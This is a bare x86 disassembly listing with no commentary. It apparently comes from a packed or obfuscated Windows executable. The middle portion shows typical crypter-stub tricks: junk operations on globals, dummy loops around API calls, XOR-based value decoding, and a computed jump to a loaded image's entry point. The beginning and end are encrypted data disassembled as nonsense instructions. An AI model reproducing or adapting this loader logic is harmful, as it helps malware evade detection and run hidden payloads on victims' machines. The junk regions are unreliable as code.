  40d792:	out    0x38,al
  40d794:	adc    bh,BYTE PTR [edi+0x70687f20]
  40d79a:	ins    DWORD PTR es:[edi],dx
  40d79b:	push   ds
  40d79c:	dec    ebp
  40d79d:	xlat   BYTE PTR ds:[ebx]
  40d79e:	loopne 0x40d80d
  40d7a0:	jo     0x40d812
  40d7a2:	(bad)  
  40d7a3:	(bad)  
  40d7a4:	fistp  WORD PTR [ebp-0x11d557ea]
  40d7aa:	aam    0x36
  40d7ac:	push   edx
  40d7ad:	mov    ebx,0x79be0c37
  40d7b2:	aad    0xf0
  40d7b4:	pop    edx
  40d7b5:	xchg   ebx,eax
  40d7b6:	push   esp
  40d7b7:	push   0xdb3084fd
  40d7bc:	push   0x63
  40d7be:	mov    bh,0x31
  40d7c0:	cwde   
  40d7c1:	das    
  40d7c2:	lods   al,BYTE PTR ds:[esi]
  40d7c3:	inc    edi
  40d7c4:	arpl   WORD PTR [ecx+0x3956e6b9],bx
  40d7ca:	sar    BYTE PTR [esi-0x761a7807],0x30
  40d7d1:	cmp    dl,BYTE PTR [edi+0x36aed07]
  40d7d7:	js     0x40d7f3
  40d7d9:	dec    ebx
  40d7da:	adc    edx,DWORD PTR [ecx-0x1e]
  40d7dd:	add    al,0x90
  40d7df:	(bad)  
  40d7e0:	mov    ah,0xd7
  40d7e2:	xlat   BYTE PTR ds:[ebx]
  40d7e3:	loopne 0x40d7c7
  40d7e5:	lahf   
  40d7e6:	aam    0x3e
  40d7e8:	sub    esp,edx
  40d7ea:	pop    edx
  40d7eb:	div    BYTE PTR [eax-0x3b]
  40d7ee:	pop    ss
  40d7ef:	icebp  
  40d7f0:	arpl   WORD PTR [eax-0x5],sp
  40d7f3:	adc    bh,BYTE PTR [esi]
  40d7f5:	jle    0x40d7a5
  40d7f7:	sbb    DWORD PTR [edi],edx
  40d7f9:	mov    ds:0x7ae87078,eax
  40d7fe:	rcr    DWORD PTR [edi-0x6c],cl
  40d801:	mov    WORD PTR [ecx+eiz*4-0xddab7e6],cs
  40d808:	(bad)  
  40d809:	pop    ebp
  40d80a:	jne    0x40d7ad
  40d80c:	ret    0xc347
  40d80f:	inc    ecx
  40d810:	outs   dx,DWORD PTR ds:[esi]
  40d811:	add    ecx,DWORD PTR [edi+ebp*2-0x343c5a23]
  40d818:	std    
  40d819:	inc    eax
  40d81a:	ja     0x40d7f9
  40d81c:	inc    eax
  40d81d:	(bad)  
  40d81e:	jmp    0x48c04ef6
  40d823:	xor    eax,0xf045e305
  40d828:	mov    ebp,0xc30e580d
  40d82d:	in     al,dx
  40d82e:	xor    BYTE PTR [ebx+0x25b6df26],bl
  40d834:	fs mov esp,0x669fac1f
  40d83a:	adc    cl,BYTE PTR [esp+ecx*2+0x7e]
  40d83e:	xor    dl,dl
  40d840:	add    eax,DWORD PTR [ebp-0x1806d82a]
  40d846:	and    al,0x12
  40d848:	frstor [eax]
  40d84a:	fcmovb st,st(5)
  40d84c:	fdiv   DWORD PTR [eax+0x35]
  40d84f:	(bad)  
  40d851:	add    DWORD PTR [edi],0xfcc6aff1
  40d857:	and    al,0x1
  40d859:	mov    esi,0x89c3e544
  40d85e:	xor    DWORD PTR fs:[ebx+0x79165193],0x55
  40d866:	jp     0x40d88b
  40d868:	adc    dl,BYTE PTR [ecx+0x6e]
  40d86b:	fiadd  WORD PTR [ecx+ecx*4+0x5b]
  40d86f:	fwait
  40d870:	dec    ebp
  40d871:	sbb    al,0x3
  40d873:	jge    0x40d865
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x62512fbc]
  40e122:	push   ecx
  40e123:	or     eax,0x7070a668
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e14f
  40e12d:	ret    0xb68e
  40e130:	stos   DWORD PTR es:[edi],eax
  40e131:	fldcw  WORD PTR [eax]
  40e133:	out    0x31,al
  40e135:	cwde   
  40e136:	cmp    BYTE PTR [eax-0x42e26c68],0x51
  40e13d:	icebp  
  40e13e:	aas    
  40e13f:	adc    BYTE PTR [ecx+ecx*4-0x383d4f10],cl
  40e146:	inc    esi
  40e147:	mov    BYTE PTR [eax],bl
  40e149:	sub    esi,DWORD PTR [ebp-0x1]
  40e14c:	retf   0xf527
  40e14f:	add    esp,DWORD PTR [edx]
  40e151:	xchg   DWORD PTR [ebp+0x6a],esi
  40e154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e155:	xchg   esp,eax
  40e156:	pushf  
  40e157:	inc    ecx
  40e158:	add    dh,BYTE PTR [edi-0x6efcde29]
  40e15e:	cwde   
  40e15f:	imul   ebx,DWORD PTR [edx],0x6c0202e9
  40e165:	mov    bl,0x18
  40e167:	fld    QWORD PTR [edx+eiz*1]
  40e16a:	into   
  40e16b:	adc    BYTE PTR [edx],0x7a
  40e16e:	shl    bh,0x29
  40e171:	stos   BYTE PTR es:[edi],al
  40e172:	leave  
  40e173:	mov    al,ds:0xed8a4910
  40e178:	xor    DWORD PTR [edi-0x54],eax
  40e17b:	int3   
  40e17c:	gs sbb dl,al
  40e17f:	push   edx
  40e180:	fwait
  40e181:	nop
  40e182:	mov    dh,0xec
  40e184:	sbb    DWORD PTR [edx],edx
  40e186:	lods   al,BYTE PTR ds:[esi]
  40e187:	xchg   esi,eax
  40e188:	mov    ebp,0x52e5e4dd
  40e18d:	cmp    esp,DWORD PTR [eax+0x67e6830b]
  40e193:	adc    DWORD PTR [ebp+eax*4-0x2],edi
  40e197:	out    dx,al
  40e198:	mov    dl,0xce
  40e19a:	(bad)  
  40e19b:	gs cmp edi,ecx
  40e19e:	(bad)  
  40e19f:	bnd ja 0x40e130
  40e1a2:	ficom  WORD PTR [edx+0x3dc6cfc7]
  40e1a8:	inc    ebp
  40e1a9:	adc    ch,0x9
  40e1ac:	cmp    BYTE PTR [edx+eiz*8],dh
  40e1af:	cmp    al,dl
  40e1b1:	cld    
  40e1b2:	sub    BYTE PTR [edx-0x73e60903],bl
  40e1b8:	lahf   
  40e1b9:	cs sahf 
  40e1bb:	addr16 push esi
  40e1bd:	arpl   bx,si
  40e1bf:	sub    BYTE PTR [edx],ch
  40e1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c2:	xchg   esp,eax
  40e1c3:	mov    dl,0xbf
  40e1c5:	cmp    BYTE PTR [ecx],ah
  40e1c7:	xor    DWORD PTR [esi+0x4bcda15a],esi
  40e1cd:	adc    BYTE PTR [esi],0x1
  40e1d0:	mov    ds:0x8a8885ae,eax
  40e1d5:	std    
  40e1d6:	cmp    al,0x82
  40e1d8:	jo     0x40e15c
  40e1da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1db:	add    edx,DWORD PTR [esp+edi*8+0x65e88c62]
